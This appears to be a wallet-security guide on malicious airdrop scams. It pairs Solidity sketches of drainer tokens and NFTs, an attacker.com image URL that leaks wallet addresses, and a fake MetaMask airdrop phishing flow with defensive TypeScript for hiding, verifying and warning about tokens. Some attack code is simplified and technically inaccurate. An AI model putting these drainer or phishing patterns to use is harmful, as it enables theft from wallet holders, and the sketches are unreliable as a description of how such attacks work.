# Malicious Airdrop Trap

## 📋 Attack Information
**Category**: Social Engineering | **Severity**: 🔴 High (CVSS 8.0)

## 🎯 Attack Principle
Attacker sends seemingly valuable token/NFT airdrops that actually contain malicious contracts or phishing traps.

## 💀 Attack Scenarios

### Scenario 1: Malicious Token Contract
```solidity
// Malicious ERC-20 token
contract ScamToken {
    function transfer(address to, uint amount) public returns (bool) {
        // ✅ Normal transfer
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }
    
    function approve(address spender, uint amount) public returns (bool) {
        // ❌ Malicious: Steals all ETH on approval
        payable(owner).transfer(address(this).balance);
        
        // Or steals other tokens
        IERC20(USDT).transferFrom(msg.sender, owner, IERC20(USDT).balanceOf(msg.sender));
        
        return true;
    }
}

// User receives airdrop
// Tries to sell → needs approve
// On approve → all assets stolen
```

### Scenario 2: Malicious NFT Image
```solidity
// NFT metadata
{
  "name": "Free NFT",
  "image": "https://attacker.com/nft.jpg?wallet={userAddress}"
}

// User views NFT
// → Browser loads image
// → Attacker knows wallet address
// → Link to user identity
// → Targeted phishing attack
```

### Scenario 3: Fake Official Airdrop
```
Twitter announcement (fake):
"@MetaMask is doing an airdrop!
Claim 1000 MASK tokens!
Visit: metamask-airdrop[.]com"

→ Fake website
→ Connect wallet
→ Sign "claim airdrop"
→ Actually approve unlimited allowance
→ All tokens stolen
```

### Scenario 4: NFT Contract Trap
```solidity
// Malicious NFT contract
contract MaliciousNFT {
    function transferFrom(address from, address to, uint tokenId) public {
        // Normal transfer
        _transfer(from, to, tokenId);
        
        // ❌ Malicious: Also transfers all other NFTs
        for (uint i = 0; i < otherNFTContracts.length; i++) {
            IERC721(otherNFTContracts[i]).transferFrom(
                from, 
                attacker, 
                allTokenIds[i]
            );
        }
    }
}
```

## 🛡️ Defense Measures

### 1. Hide Unknown Tokens
```typescript
/**
 * Default hide unknown airdrops
 */
interface TokenSettings {
  showUnknownTokens: boolean;
  autoHideScamTokens: boolean;
  requireManualApproval: boolean;
}

const [settings, setSettings] = useState<TokenSettings>({
  showUnknownTokens: false, // ✅ Hide by default
  autoHideScamTokens: true,  // ✅ Auto-hide scam tokens
  requireManualApproval: true, // ✅ Manual approval needed
});

// Token list
<TokenList>
  {tokens
    .filter(t => settings.showUnknownTokens || t.isVerified)
    .map(token => <TokenItem token={token} />)
  }
  
  {hiddenTokenCount > 0 && (
    <Button onClick={() => showHiddenTokens()}>
      {hiddenTokenCount} unknown tokens (possibly scams)
    </Button>
  )}
</TokenList>
```

### 2. Token Verification Database
```typescript
/**
 * Verify token legitimacy
 */
interface TokenVerification {
  address: string;
  isScam: boolean;
  isVerified: boolean;
  warnings: string[];
  source: 'coingecko' | 'etherscan' | 'community';
}

async function verifyToken(address: string): Promise<TokenVerification> {
  // 1. Query CoinGecko
  const coinGeckoInfo = await coingecko.getTokenInfo(address);
  
  // 2. Query Etherscan
  const etherscanInfo = await etherscan.getTokenInfo(address);
  
  // 3. Query community reports
  const reports = await checkScamDatabase(address);
  
  // 4. Analyze contract code
  const code = await provider.getCode(address);
  const hasHoneypot = await detectHoneypot(code);
  
  return {
    address,
    isScam: reports.isScam || hasHoneypot,
    isVerified: coinGeckoInfo.verified,
    warnings: [...reports.warnings, ...codeWarnings],
  };
}

// Display
<TokenCard token={token}>
  {token.verification.isScam && (
    <Badge color="red">⚠️ Scam Token</Badge>
  )}
  {token.verification.isVerified && (
    <Badge color="green">✅ Verified</Badge>
  )}
</TokenCard>
```

### 3. Pre-Interaction Warning
```typescript
/**
 * Warn before interacting with unknown token
 */
const handleTokenInteraction = async (tokenAddress: string, action: string) => {
  const verification = await verifyToken(tokenAddress);
  
  if (verification.isScam) {
    Alert.alert(
      '🚨 Scam Token Warning',
      `
      This token has been flagged as a scam!
      ${verification.warnings.join('\n')}
      
      Strongly recommend NOT interacting!
      `,
      [{ text: 'Cancel', style: 'cancel' }]
    );
    return;
  }
  
  if (!verification.isVerified) {
    const confirmed = await showConfirmDialog({
      title: '⚠️ Unverified Token',
      message: `
        This token is not verified and may pose risks.
        
        Operation: ${action}
        Contract: ${tokenAddress}
        
        Risks:
        - May be honeypot contract (can buy but not sell)
        - May contain malicious code
        - May steal your other assets
        
        Are you sure you want to continue?
      `,
      buttons: ['Cancel', 'I Understand Risks, Continue'],
    });
    
    if (!confirmed) return;
  }
  
  // Execute operation
  await executeTokenAction(tokenAddress, action);
};
```

### 4. Honeypot Detection
```typescript
/**
 * Detect honeypot contracts
 */
async function detectHoneypot(tokenAddress: string): Promise<HoneypotResult> {
  // 1. Check buy/sell tax
  const buyTax = await simulateBuy(tokenAddress, 0.1);
  const sellTax = await simulateSell(tokenAddress, buyTax.received);
  
  // 2. Honeypot characteristics
  const isHoneypot = sellTax.canSell === false || sellTax.tax > 0.5;
  
  // 3. Check owner privileges
  const code = await provider.getCode(tokenAddress);
  const hasOwnerMint = code.includes('mint') && code.includes('onlyOwner');
  const canPause = code.includes('pause') && code.includes('onlyOwner');
  
  return {
    isHoneypot,
    canSell: sellTax.canSell,
    buyTax: buyTax.tax,
    sellTax: sellTax.tax,
    risks: {
      ownerCanMint: hasOwnerMint,
      ownerCanPause: canPause,
    },
  };
}
```

### 5. User Education
```typescript
<Alert severity="error">
  <h4>🚨 How to Identify Malicious Airdrops?</h4>
  
  <h5>❌ Scam Characteristics:</h5>
  <ul>
    <li>Claims "official airdrop" without official announcement</li>
    <li>Requires approve to claim</li>
    <li>Requires wallet connection to unknown website</li>
    <li>Asks for private key/seed phrase</li>
    <li>Abnormally large airdrop amount (1000 ETH?)</li>
  </ul>
  
  <h5>✅ Real Airdrop Characteristics:</h5>
  <ul>
    <li>Official Twitter/Discord announcement</li>
    <li>Directly sent to account, no action needed</li>
    <li>No authorization required</li>
    <li>Reasonable amount</li>
  </ul>
  
  <h5>🛡️ Safety Recommendations:</h5>
  <ul>
    <li>✅ Default hide unknown tokens</li>
    <li>✅ Don't try to sell unknown airdrops</li>
    <li>✅ Don't click airdrop token websites</li>
    <li>✅ Don't approve unknown contracts</li>
    <li>⚠️ When in doubt, ignore the airdrop</li>
  </ul>
</Alert>
```

## ✅ Recommended Settings
```typescript
// Settings
<Settings>
  <Toggle
    label="Auto-hide unknown tokens"
    value={hideUnknown}
    onChange={setHideUnknown}
  />
  
  <Toggle
    label="Show scam warnings"
    value={showScamWarnings}
    onChange={setShowScamWarnings}
  />
  
  <Button onPress={() => reportScamToken(address)}>
    Report Scam Token
  </Button>
</Settings>
```

**Created**: November 11, 2025

